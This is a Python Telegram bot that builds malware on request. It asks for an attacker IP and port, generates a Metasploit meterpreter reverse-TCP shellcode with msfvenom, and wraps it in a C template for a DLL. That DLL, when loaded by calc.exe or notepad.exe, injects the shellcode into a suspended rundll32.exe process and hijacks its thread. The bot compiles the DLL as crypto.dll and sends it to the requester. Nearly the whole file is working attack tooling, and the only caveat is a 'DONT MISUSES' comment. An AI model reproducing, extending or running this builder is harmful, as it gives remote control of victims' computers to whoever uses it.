import os
import sys
import subprocess
import logging
from colorama import Fore, Style
import telebot
from telebot import types
import time

logging.basicConfig(level=logging.DEBUG, filemode='w', filename='exploit.log', format='[%(asctime)s] - %(levelname)s %(message)s')

TOKEN = "Weka Telegram TOKEN Generated by Botfather"
bot = telebot.TeleBot(TOKEN)

user_ip = None
user_port = None

def check_root(chat_id):
    if "SUDO_UID" not in os.environ.keys():
        bot.send_message(chat_id, '[Error] Script must be run as root. Exiting...')
        sys.exit()
    else:
        logging.warning('Program is running as root')

def check_file(chat_id, required_files=['bot.py']):
    try:
        for exploit in required_files:
            if os.path.isfile(exploit):
                return True
            else:
                logging.error('exploit.c file not found or corrupted')
                bot.send_message(chat_id, '[Error] exploit.c file not found or corrupted. Please find more info in exploit.log')
                return False
    except KeyboardInterrupt:
        sys.exit('\nByeee!!!')

def build_shell_codes(chat_id, ip, port, output_file):
    try:
        gen = [
            'msfvenom', 
            '-p', 'windows/x64/meterpreter/reverse_tcp', 
            f'LHOST={ip}', 
            f'LPORT={port}', 
            '-f', 'c'
        ]

        result = subprocess.run(gen, capture_output=True, text=True)

        if result.returncode == 0:
            with open(output_file, 'w') as f:
                f.write(result.stdout)
            with open(output_file, 'r') as file:
                lines = file.readlines()
            filtered_lines = [line for line in lines if not line.startswith('unsigned char buf[] =')]
            with open('/tmp/file.txt', 'w') as file:
                file.writelines(filtered_lines)

            logging.info(f'Shellcode successfully saved to {output_file}')
            bot.send_message(chat_id, f"[Success] Shellcode generated successfully")
            time.sleep(2)
        else:
            logging.error(f'Error generating shellcode: {result.stderr}')
            bot.send_message(chat_id, f"[Error in Building] Please find more info in exploit.log")
            exit()
        
    except Exception as e:
        logging.error(e)
        bot.send_message(chat_id, f"[Error] {str(e)}. Please find more info in exploit.log")
        exit()

def process_exploit(chat_id):
    cds = ['x86_64-w64-mingw32-gcc', 'generated_code.c', '-o', 'crypto.dll', '-shared']
    exec_ = subprocess.run(cds)
    if exec_.returncode == 0:
        bot.send_message(chat_id, 'Successfully: DLL file saved as crypto.dll')
        with open('crypto.dll', 'rb') as dll_file:
            bot.send_document(chat_id, dll_file)
    else:
        logging.error('Failed to build the DLL using Mingw32-gcc')
        bot.send_message(chat_id, 'Failed to build the DLL using Mingw32-gcc. Build failed')
        exit('\nBuild failed')

def generate_c_code(shellcode):
    code = f'''
#include <windows.h>
#include <string.h>

/*
    Coded By AuxGrep 
    DONT MISUSES 
 */

#define SCSIZE 2048

unsigned char code[SCSIZE] = {shellcode}

#define MAXFILEPATHLEN 2048

// Zeroes out a memory area
void inline_bzero(void *p, size_t l) {{
    memset(p, 0, l);
}}

// Checks if the target substring exists in the str
char* filenamecheck(const char *str, const char *target) {{
    if (!*target) return (char*)str;
    const char *p1 = str;
    while (*p1) {{
        const char *p1Begin = p1, *p2 = target;
        while (*p1 && *p2 && *p1 == *p2) {{
            p1++;
            p2++;
        }}
        if (!*p2) return (char*)p1Begin;
        p1 = p1Begin + 1;
    }}
    return NULL;
}}

// Function to execute the payload
void ExecutePayload(void) {{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    CONTEXT ctx;
    LPVOID ep;

    inline_bzero(&si, sizeof(si));
    si.cb = sizeof(si);

    // Create a suspended process
    if (CreateProcess(NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {{
        ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
        GetThreadContext(pi.hThread, &ctx);

        // Allocate memory in the new process
        ep = VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, ep, code, SCSIZE, NULL);

        // Set the instruction pointer to the payload
        ctx.Rip = (DWORD64)ep;

        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }}
}}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {{
    TCHAR filePath[MAXFILEPATHLEN];
    const TCHAR *victimPrograms[] = {{ "calc.exe", "notepad.exe" }};
    int i;

    switch (dwReason) {{
        case DLL_PROCESS_ATTACH:
            GetModuleFileName(NULL, filePath, MAXFILEPATHLEN);
            for (i = 0; i < sizeof(victimPrograms) / sizeof(victimPrograms[0]); i++) {{
                if (filenamecheck(filePath, victimPrograms[i])) {{
                    ExecutePayload();
                    break;
                }}
            }}
            break;

        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }}
    return TRUE;
}}'''
    return code

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, 'Hello! Send /generate to create shell code')

@bot.message_handler(commands=['generate'])
def generate_shellcode(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, 'Please enter the attacker IP:')
    bot.register_next_step_handler(message, get_ip)

def get_ip(message):
    global user_ip
    user_ip = message.text
    bot.send_message(message.chat.id, 'Please enter the attacker port:')
    bot.register_next_step_handler(message, get_port)

def get_port(message):
    global user_port
    user_port = message.text
    chat_id = message.chat.id
    output_file = '/tmp/shell.txt'
    
    check_root(chat_id)
    
    if check_file(chat_id):
        build_shell_codes(chat_id, ip=user_ip, port=user_port, output_file=output_file)
        with open('/tmp/file.txt', 'r') as f:
            shellcode = f.read()
        with open('generated_code.c', 'w') as f:
            f.write(generate_c_code(shellcode))
        process_exploit(chat_id)

if __name__ == "__main__":
    bot.polling()
